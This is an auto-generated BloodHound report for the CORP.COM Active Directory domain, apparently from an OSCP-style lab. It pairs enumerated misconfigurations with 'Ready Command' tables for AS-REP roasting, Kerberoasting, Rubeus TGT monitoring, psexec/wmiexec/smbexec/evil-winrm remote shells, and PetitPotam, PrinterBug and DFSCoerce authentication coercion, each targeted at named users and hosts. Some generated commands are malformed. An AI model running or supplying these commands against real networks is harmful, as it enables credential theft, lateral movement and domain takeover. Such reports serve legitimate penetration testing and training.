# BloodHound Enhanced Report

**Generated:** 2025-11-28 07:38:55

---

## Data Inventory

**Domains:** CORP.COM

| Type | Count | Details |
|------|-------|---------|
| Users | 12 | 10 enabled |
| Computers | 6 | CLIENT74.CORP.COM, CLIENT75.CORP.COM, CLIENT76.CORP.COM |
| Groups | 57 | ACCOUNT OPERATORS@CORP.COM, ADMINISTRATORS@CORP.COM, BACKUP OPERATORS@CORP.COM |

**Relationships:** GenericAll: 193 | WriteDacl: 146 | MemberOf: 56 | AdminTo: 12 | CanRDP: 6 | HasSession: 5 | DCSync: 5 | CanPSRemote: 2

## Attack Commands

## Attack Commands

### Quick Wins

### impacket-GetNPUsers - AS-REP Roasting Attack 

**Objective:** Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).
Targets misconfigured accounts to obtain crackable password hashes without authentication.
**Rewards:** AS-REP roast - no auth required
**Template:** `impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>`
**Example:** `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
**Requires:** None (pre-auth disabled on target)

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| DAVE@CORP.COM | CORP.COM |  | AS-REP roast - no auth required | `impacket-GetNPUsers -dc-ip DC01.CORP.COM -request -outputfile <OUTPUT_FILE> corp.com/<USER>` |

### impacket-GetUserSPNs - Kerberoasting Attack 

**Objective:** Request and extract TGS-REP hashes for service accounts (Kerberoasting)
**Rewards:** Kerberoast - request TGS for offline cracking
**Template:** `impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:"<PASSWORD>"`
**Example:** `impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:"VimForPowerShell123!"`
**Need:** <PASSWORD>
**Requires:** Any authenticated domain user

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| BACKUPUSER@CORP.COM | CORP.COM |  | Kerberoast - request TGS for offline cracking | `impacket-GetUserSPNs -request -dc-ip DC01.CORP.COM corp.com/<USER>:"<PASSWORD>"` |
| IIS_SERVICE@CORP.COM | CORP.COM |  | Kerberoast - request TGS for offline cracking | `impacket-GetUserSPNs -request -dc-ip DC01.CORP.COM corp.com/<USER>:"<PASSWORD>"` |

### Rubeus - Monitor for TGTs (Unconstrained Delegation) 

**Objective:** Monitor for incoming TGTs on unconstrained delegation host
**Rewards:** Unconstrained delegation - monitor for TGT capture
**Template:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>`
**Example:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$`
**Need:** <TARGET_USER>
**Requires:** Local admin on unconstrained delegation host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | DC1.CORP.COM |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |

### Lateral Movement

### Impacket PSExec - Remote Shell [AdminTo]

**Objective:** Execute commands remotely via PSExec
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>`
**Example:** `impacket-psexec domain.local/administrator:Password123@192.168.1.10`
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DAVE@CORP.COM | CLIENT75.CORP.COM |  | DAVE has local admin rights on CLIENT75 | `impacket-psexec corp.com/DAVE:<PASS>@CLIENT75.CORP.COM` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-psexec corp.com/DAVE:<PASS>@CLIENT74.CORP.COM` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-psexec corp.com/JEFF:<PASS>@CLIENT74.CORP.COM` |
| JEFF@CORP.COM | CLIENT75.CORP.COM |  | JEFF has local admin rights on CLIENT75 | `impacket-psexec corp.com/JEFF:<PASS>@CLIENT75.CORP.COM` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-psexec corp.com/STEPHANIE:<PASS>@CLIENT74.CORP.COM` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-psexec corp.com/JEN:<PASS>@CLIENT74.CORP.COM` |

### Impacket WMIExec - Remote Shell [AdminTo]

**Objective:** Execute commands via WMI (semi-interactive)
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>`
**Example:** `impacket-wmiexec domain.local/administrator:Password123@192.168.1.10`
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DAVE@CORP.COM | CLIENT75.CORP.COM |  | DAVE has local admin rights on CLIENT75 | `impacket-wmiexec corp.com/DAVE:<PASS>@CLIENT75.CORP.COM` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-wmiexec corp.com/DAVE:<PASS>@CLIENT74.CORP.COM` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-wmiexec corp.com/JEFF:<PASS>@CLIENT74.CORP.COM` |
| JEFF@CORP.COM | CLIENT75.CORP.COM |  | JEFF has local admin rights on CLIENT75 | `impacket-wmiexec corp.com/JEFF:<PASS>@CLIENT75.CORP.COM` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-wmiexec corp.com/STEPHANIE:<PASS>@CLIENT74.CORP.COM` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-wmiexec corp.com/JEN:<PASS>@CLIENT74.CORP.COM` |

### Impacket SMBExec - Remote Shell [AdminTo]

**Objective:** Execute commands via SMB (fileless)
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>`
**Example:** `impacket-smbexec domain.local/administrator:Password123@192.168.1.10`
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DAVE@CORP.COM | CLIENT75.CORP.COM |  | DAVE has local admin rights on CLIENT75 | `impacket-smbexec corp.com/DAVE:<PASS>@CLIENT75.CORP.COM` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-smbexec corp.com/DAVE:<PASS>@CLIENT74.CORP.COM` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-smbexec corp.com/JEFF:<PASS>@CLIENT74.CORP.COM` |
| JEFF@CORP.COM | CLIENT75.CORP.COM |  | JEFF has local admin rights on CLIENT75 | `impacket-smbexec corp.com/JEFF:<PASS>@CLIENT75.CORP.COM` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-smbexec corp.com/STEPHANIE:<PASS>@CLIENT74.CORP.COM` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-smbexec corp.com/JEN:<PASS>@CLIENT74.CORP.COM` |

### Impacket PSExec - Remote Shell [AdminTo]

**Objective:** Execute commands remotely via PSExec
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>`
**Example:** `impacket-psexec domain.local/administrator:Password123@192.168.1.10`
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | JEN@CORP.COM |  | User has local admin rights on JEN@CORP | `impacket-psexec /:<PASS>@JEN@CORP.COM` |
|  | JEFF@CORP.COM |  | User has local admin rights on JEFF@CORP | `impacket-psexec /:<PASS>@JEFF@CORP.COM` |
|  | STEPHANIE@CORP.COM |  | User has local admin rights on STEPHANIE@CORP | `impacket-psexec /:<PASS>@STEPHANIE@CORP.COM` |
|  | DAVE@CORP.COM |  | User has local admin rights on DAVE@CORP | `impacket-psexec /:<PASS>@DAVE@CORP.COM` |

### Evil-WinRM - PowerShell Remoting [CanPSRemote]

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** PowerShell remoting for stealthy command execution
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASS>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Requires:** Remote Management Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEFF@CORP.COM | CLIENT75.CORP.COM |  | JEFF has PSRemote/WinRM access to CLIENT75 | `evil-winrm -i CLIENT75.CORP.COM -u JEFF -p <PASS>` |
| JEFFADMIN@CORP.COM | CLIENT75.CORP.COM |  | JEFFADMIN has PSRemote/WinRM access to CLIENT75 | `evil-winrm -i CLIENT75.CORP.COM -u JEFFADMIN -p <PASS>` |

### xFreeRDP Connection [CanRDP]

**Objective:** Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass
**Rewards:** Interactive desktop access for GUI tools and credential theft
**Template:** `xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard`
**Example:** `xfreerdp /v:192.168.50.63:3389 /u:rdp_admin /p:P@ssw0rd! /cert-ignore +clipboard`
**Need:** <PASSWORD>
**Requires:** Remote Desktop Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEFFADMIN@CORP.COM | CLIENT75.CORP.COM |  | JEFFADMIN has RDP access to CLIENT75 | `xfreerdp /v:CLIENT75.CORP.COM:<PORT> /u:JEFFADMIN /p:<PASSWORD> /cert-ignore +clipboard` |
| JEFFADMIN@CORP.COM | CLIENT74.CORP.COM |  | JEFFADMIN has RDP access to CLIENT74 | `xfreerdp /v:CLIENT74.CORP.COM:<PORT> /u:JEFFADMIN /p:<PASSWORD> /cert-ignore +clipboard` |
| STEPHANIE@CORP.COM | CLIENT75.CORP.COM |  | STEPHANIE has RDP access to CLIENT75 | `xfreerdp /v:CLIENT75.CORP.COM:<PORT> /u:STEPHANIE /p:<PASSWORD> /cert-ignore +clipboard` |
| DAVE@CORP.COM | CLIENT75.CORP.COM |  | DAVE has RDP access to CLIENT75 | `xfreerdp /v:CLIENT75.CORP.COM:<PORT> /u:DAVE /p:<PASSWORD> /cert-ignore +clipboard` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has RDP access to CLIENT74 | `xfreerdp /v:CLIENT74.CORP.COM:<PORT> /u:JEFF /p:<PASSWORD> /cert-ignore +clipboard` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has RDP access to CLIENT74 | `xfreerdp /v:CLIENT74.CORP.COM:<PORT> /u:JEN /p:<PASSWORD> /cert-ignore +clipboard` |

### Impacket WMIExec - Remote Shell [ExecuteDCOM]

**Objective:** Execute commands via WMI (semi-interactive)
**Rewards:** Remote code execution via DCOM for lateral movement
**Template:** `impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>`
**Example:** `impacket-wmiexec domain.local/administrator:Password123@192.168.1.10`
**Requires:** DCOM execution rights on target

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN can execute DCOM on CLIENT74 | `impacket-wmiexec corp.com/JEN:<PASS>@CLIENT74.CORP.COM` |

### PetitPotam - Coerce NTLM Authentication [CoerceToTGT]

**Objective:** Force target machine to authenticate to attacker using EfsRpcOpenFileRaw
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 PetitPotam.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `python3 PetitPotam.py -u 'DC1.CORP.COM' -p '<PASSWORD>' -d '' <LISTENER_IP> <TARGET_IP>` |

### Coercer - Multi-Protocol Authentication Coercion [CoerceToTGT]

**Objective:** Test multiple coercion methods (MS-RPRN, MS-EFSR, MS-FSRVP, etc.)
**Rewards:** Coerce authentication to capture TGT
**Template:** `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -l <LISTENER_IP> -t <TARGET_IP>`
**Example:** `coercer coerce -u 'user' -p '<PASSWORD>' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `coercer coerce -u 'DC1.CORP.COM' -p '<PASSWORD>' -d '' -l <LISTENER_IP> -t <TARGET_IP>` |

### PrinterBug/SpoolSample - Trigger Print Spooler Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-RPRN (Print Spooler)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>`
**Example:** `python3 printerbug.py 'corp.local/user:<PASSWORD>@192.168.50.70' 192.168.50.100`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `python3 printerbug.py '/DC1.CORP.COM:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>` |

### DFSCoerce - Trigger DFS Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-DFSNM (DFS)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 dfscoerce.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `python3 dfscoerce.py -u 'DC1.CORP.COM' -p '<PASSWORD>' -d '' <LISTENER_IP> <TARGET_IP>` |

---

## Quick Wins

### ✅ AS-REP Roastable Users
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with Kerberos pre-authentication disabled (dontreqpreauth=true). These can be AS-REP roasted without authentication using GetNPUsers.py.

| User | IsPrivileged | Description |
| --- | --- | --- |
| DAVE@CORP.COM | False |  |

### ✅ Kerberoastable Service Accounts
**OSCP Relevance:** HIGH | **Results:** 2

> Find users with Service Principal Names (SPNs). These can be Kerberoasted to obtain TGS hashes for offline cracking.

| ServiceAccount | SPNs | IsPrivileged | Description |
| --- | --- | --- | --- |
| BACKUPUSER@CORP.COM | ['http/files04.corp.com'] | True |  |
| IIS_SERVICE@CORP.COM | ['HTTP/web04.corp.com', 'HTTP/web04', 'HTTP/web04.corp.com:80'] | False |  |

### ✅ High-Value Kerberoastable (Privileged + SPN)
**OSCP Relevance:** HIGH | **Results:** 1

> Find privileged users with SPNs. Cracking these provides immediate privilege escalation.

| HighValueTarget | SPNs | Description |
| --- | --- | --- |
| BACKUPUSER@CORP.COM | ['http/files04.corp.com'] |  |

### ✅ Unconstrained Delegation Systems
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation enabled. These can be abused to capture TGTs from authenticating users (printer bug, coercion attacks).

| Computer | OS | Description |
| --- | --- | --- |
| DC1.CORP.COM | WINDOWS SERVER 2022 STANDARD |  |

### ⚪ Constrained Delegation Principals
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Users with Passwords in Description
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Accounts with Password Never Expires
**OSCP Relevance:** MEDIUM | **Results:** 8

> Find accounts with non-expiring passwords. Often service accounts with weak passwords or credentials in documentation.

| User | IsPrivileged | Description |
| --- | --- | --- |
| JEFFADMIN@CORP.COM | True |  |
| ADMINISTRATOR@CORP.COM | True | Built-in account for administering the computer/domain |
| DAVE@CORP.COM | False |  |
| STEPHANIE@CORP.COM | False |  |
| JEFF@CORP.COM | False |  |
| IIS_SERVICE@CORP.COM | False |  |
| PETE@CORP.COM | False |  |
| JEN@CORP.COM | False |  |

### ✅ Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find accounts that have never logged in. May have default or documented passwords.

| User | Description | Created |
| --- | --- | --- |
| BACKUPUSER@CORP.COM |  | 1764203059.0 |

### ✅ Computers Without LAPS
**OSCP Relevance:** MEDIUM | **Results:** 5

> Find computers that don't have LAPS deployed. Local admin passwords may be reused or weak.

| Computer | OS |
| --- | --- |
| CLIENT74.CORP.COM | WINDOWS 11 ENTERPRISE |
| CLIENT75.CORP.COM | WINDOWS 11 PRO |
| CLIENT76.CORP.COM | WINDOWS 10 PRO |
| FILES04.CORP.COM | WINDOWS SERVER 2022 STANDARD |
| WEB04.CORP.COM | WINDOWS SERVER 2022 STANDARD |

### ✅ Pre-Windows 2000 Compatible Access Accounts
**OSCP Relevance:** LOW | **Results:** 1

> Find computers in Pre-Windows 2000 Compatible Access group. Legacy compatibility may expose vulnerabilities.

| Member | Type | ViaGroup |
| --- | --- | --- |
| AUTHENTICATED USERS@CORP.COM | ['Group', 'Base'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@CORP.COM |

### ⚪ ReadGMSAPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ReadLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ All gMSA Accounts
**OSCP Relevance:** HIGH | **Results:** None

---

## Lateral Movement

### ✅ Non-DA Users with Local Admin on Workstations
**OSCP Relevance:** HIGH | **Results:** 4

> Find non-privileged users with local admin rights on workstations (not DCs). KEY QUERY from DCSync capstone - discovered MIKE->CLIENT75 attack path. These are prime lateral movement targets.

| User | AdminOnComputers | ComputerCount |
| --- | --- | --- |
| DAVE@CORP.COM | ['CLIENT75.CORP.COM', 'CLIENT74.CORP.COM'] | 2 |
| JEFF@CORP.COM | ['CLIENT74.CORP.COM', 'CLIENT75.CORP.COM'] | 2 |
| STEPHANIE@CORP.COM | ['CLIENT74.CORP.COM'] | 1 |
| JEN@CORP.COM | ['CLIENT74.CORP.COM'] | 1 |

### ✅ All Local Admins per Computer
**OSCP Relevance:** HIGH | **Results:** 2

> Enumerate all principals (users, groups) with local admin rights on each computer. Useful for identifying high-value targets with many admin paths.

| Computer | LocalAdmins | AdminCount |
| --- | --- | --- |
| CLIENT74.CORP.COM | ['JEN@CORP.COM', 'JEFF@CORP.COM', 'STEPHANIE@CORP.COM', 'DOMAIN ADMINS@CORP.COM', 'DAVE@CORP.COM'] | 5 |
| CLIENT75.CORP.COM | ['DOMAIN ADMINS@CORP.COM', 'DAVE@CORP.COM', 'JEFF@CORP.COM'] | 3 |

### ✅ PSRemote Access (Evil-WinRM Targets)
**OSCP Relevance:** HIGH | **Results:** 2

> Find users with PowerShell Remoting access to computers. These are Evil-WinRM targets for lateral movement.

| User | PSRemoteTargets | TargetCount |
| --- | --- | --- |
| JEFF@CORP.COM | ['CLIENT75.CORP.COM'] | 1 |
| JEFFADMIN@CORP.COM | ['CLIENT75.CORP.COM'] | 1 |

### ✅ RDP Access Targets
**OSCP Relevance:** HIGH | **Results:** 5

> Find users with Remote Desktop access to computers. RDP provides interactive access for credential harvesting.

| User | RDPTargets | TargetCount |
| --- | --- | --- |
| JEFFADMIN@CORP.COM | ['CLIENT75.CORP.COM', 'CLIENT74.CORP.COM'] | 2 |
| STEPHANIE@CORP.COM | ['CLIENT75.CORP.COM'] | 1 |
| DAVE@CORP.COM | ['CLIENT75.CORP.COM'] | 1 |
| JEFF@CORP.COM | ['CLIENT74.CORP.COM'] | 1 |
| JEN@CORP.COM | ['CLIENT74.CORP.COM'] | 1 |

### ✅ DCOM Execution Rights
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find users with DCOM execution rights on computers. DCOM can be used for lateral movement via impacket-dcomexec.

| User | DCOMTargets | TargetCount |
| --- | --- | --- |
| JEN@CORP.COM | ['CLIENT74.CORP.COM'] | 1 |

### Sessions on Specific Computer
*Skipped - requires variables: COMPUTER*

### All Computer Access for Specific User
*Skipped - requires variables: USER*

### All Users Who Can Access Specific Computer
*Skipped - requires variables: COMPUTER*

### ⚪ Computers Where Domain Users Are Local Admin
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Computers with Multiple Admin Paths
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find computers accessible via multiple different users. These are high-value targets with more exploitation options.

| Computer | NumberOfAdminPaths | Admins |
| --- | --- | --- |
| CLIENT74.CORP.COM | 5 | ['JEN@CORP.COM', 'JEFF@CORP.COM', 'STEPHANIE@CORP.COM', 'DOMAIN ADMINS@CORP.COM', 'DAVE@CORP.COM'] |
| CLIENT75.CORP.COM | 3 | ['DOMAIN ADMINS@CORP.COM', 'DAVE@CORP.COM', 'JEFF@CORP.COM'] |

### ⚪ Workstations with Domain Admin Sessions
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Cross-Trust Lateral Movement
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Coercion Targets (Unconstrained Delegation)
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation that can capture TGTs via coercion attacks (PetitPotam, PrinterBug, DFSCoerce). Coerce a DC to authenticate to these systems to capture its TGT.

| CoercionHost | OS | CanCaptureTGTFrom | TargetType |
| --- | --- | --- | --- |
| DC1.CORP.COM | WINDOWS SERVER 2022 STANDARD | CORP.COM | ['Base', 'Domain', 'Tag_Tier_Zero'] |

### ⚪ SID History Abuse Paths
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Domain Trust Relationships
**OSCP Relevance:** HIGH | **Results:** None

---

## Privilege Escalation

### ✅ DCSync Rights
**OSCP Relevance:** HIGH | **Results:** 6

> Find principals with DCSync rights (GetChanges + GetChangesAll on Domain). Can perform secretsdump.py to extract all domain hashes.

| Principal | Type | Right |
| --- | --- | --- |
| DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] | GetChangesAll |
| ENTERPRISE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] | GetChanges |
| DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |

### ✅ GenericAll on High-Value Targets
**OSCP Relevance:** HIGH | **Results:** 26

> Find principals with GenericAll (full control) over privileged users, groups, or computers. Can reset passwords, modify group memberships, etc.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ACCOUNT OPERATORS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |

### ⚪ Shadow Admins (Control over DA Users)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ WriteDacl Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 69

> Find principals with WriteDacl on high-value targets. Can grant themselves GenericAll then escalate further.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ADMINISTRATORS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
